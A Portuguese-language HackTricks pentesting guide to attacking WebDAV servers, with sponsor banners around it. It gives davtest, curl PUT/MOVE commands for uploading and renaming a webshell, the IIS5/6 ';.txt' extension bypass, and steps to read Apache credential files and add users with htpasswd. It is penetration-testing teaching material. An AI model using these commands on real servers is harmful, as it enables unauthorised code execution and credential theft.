# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Ao lidar com um **Servidor HTTP com WebDav** habilitado, √© poss√≠vel **manipular arquivos** se voc√™ tiver as **credenciais corretas**, geralmente verificadas por meio da **Autentica√ß√£o B√°sica HTTP**. Obter controle sobre esse servidor frequentemente envolve o **upload e execu√ß√£o de um webshell**.

O acesso ao servidor WebDav geralmente requer **credenciais v√°lidas**, sendo a [**for√ßa bruta do WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) um m√©todo comum para adquiri-las.

Para superar restri√ß√µes em uploads de arquivos, especialmente aqueles que impedem a execu√ß√£o de scripts do lado do servidor, voc√™ pode:

- **Fazer upload** de arquivos com **extens√µes execut√°veis** diretamente, se n√£o estiverem restritos.
- **Renomear** arquivos n√£o execut√°veis enviados (como .txt) para uma extens√£o execut√°vel.
- **Copiar** arquivos n√£o execut√°veis enviados, alterando sua extens√£o para uma que seja execut√°vel.

## DavTest

**Davtest** tenta **fazer upload de v√°rios arquivos com diferentes extens√µes** e **verifica** se a extens√£o √© **executada**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
## Cad√°ver

Voc√™ pode usar esta ferramenta para **conectar-se ao servidor WebDav** e realizar a√ß√µes (como **upload**, **mover** ou **excluir**) **manualmente**.
```
cadaver <IP>
```
## Pedido PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Pedido MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Vulnerabilidade WebDav no IIS5/6

Essa vulnerabilidade √© muito interessante. O **WebDav** **n√£o permite** **upload** ou **renomear** arquivos com a extens√£o **.asp**. Mas voc√™ pode **burlar** isso **adicionando** no final do nome **";.txt"** e o arquivo ser√° **executado** como se fosse um arquivo .asp (voc√™ tamb√©m pode **usar ".html" em vez de ".txt"** mas **N√ÉO esque√ßa do ";"**).

Ent√£o voc√™ pode **fazer upload** do seu shell como um arquivo ".**txt"** e **copi√°-lo/mov√™-lo para um arquivo ".asp;.txt"**. Ao acessar esse arquivo atrav√©s do servidor web, ele ser√° **executado** (o cadaver dir√° que a a√ß√£o de movimenta√ß√£o n√£o funcionou, mas funcionou).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Postar credenciais

Se o Webdav estiver usando um servidor Apache, voc√™ deve verificar os sites configurados no Apache. Comumente:\
_**/etc/apache2/sites-enabled/000-default**_

Dentro dele, voc√™ pode encontrar algo como:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Como voc√™ pode ver, h√° arquivos com as credenciais v√°lidas para o servidor **webdav**:
```
/etc/apache2/users.password
```
Dentro deste tipo de arquivos voc√™ encontrar√° o **nome de usu√°rio** e um **hash** da senha. Estas s√£o as credenciais que o servidor webdav est√° usando para autenticar usu√°rios.

Voc√™ pode tentar **quebr√°-las**, ou **adicionar mais** se por algum motivo voc√™ quiser **acessar** o servidor **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Para verificar se as novas credenciais est√£o funcionando, voc√™ pode fazer:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## Refer√™ncias
* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as ferramentas comunit√°rias **mais avan√ßadas do mundo**.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
